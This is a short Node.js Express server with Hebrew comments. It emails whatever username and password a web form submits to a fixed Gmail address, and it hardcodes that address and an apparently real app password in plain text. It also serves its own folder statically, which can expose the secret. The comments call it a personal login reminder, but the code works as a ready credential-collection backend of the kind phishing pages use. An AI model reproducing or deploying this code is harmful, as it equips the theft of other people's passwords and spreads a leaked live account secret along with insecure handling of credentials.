const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// ⭐ מאפשר לשרת להציג קבצים כמו תמונות (icon.png) שנמצאים בתיקייה שלך
app.use(express.static(__dirname));

// 1. הגדרת החיבור לתיבת ה-Gmail שלך
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'nhwrybsry827@gmail.com',    // המייל שלך
        pass: 'vxve pffr cjxa aqbl'        // ✅ הסיסמה שגוגל הביאה לך מוגדרת כאן בהצלחה!
    }
});

// אומר לשרת להציג את קובץ ה-index.html כשנכנסים לאתר
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// 2. השרת מקשיב לטופס שנשלח מהאתר
app.post('/send-email', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // 3. עיצוב הודעת המייל
    const mailOptions = {
        from: 'nhwrybsry827@gmail.com',
        to: 'nhwrybsry827@gmail.com',
        subject: '🔐 תזכורת פרטי התחברות מהאתר האישי שלי',
        text: `היי, ביקשת לזכור את הפרטים הבאים:\n\nשם משתמש: ${username}\nסיסמה: ${password}`
    };

    // 4. שליחת המייל בפועל
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.send('אופס! היתה שגיאה בשליחת המייל.');
        } else {
            console.log('Email sent: ' + info.response);
            res.send('הפרטים נשלחו בהצלחה לתיבת המייל שלך!');
        }
    });
});

// 5. הפעלת השרת על פורט 3000
// הגדרה דינמית שמתאימה גם למחשב שלך וגם לשרת האינטרנט בענן
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`השרת פעיל בהצלחה בפורט ${PORT}`);
});
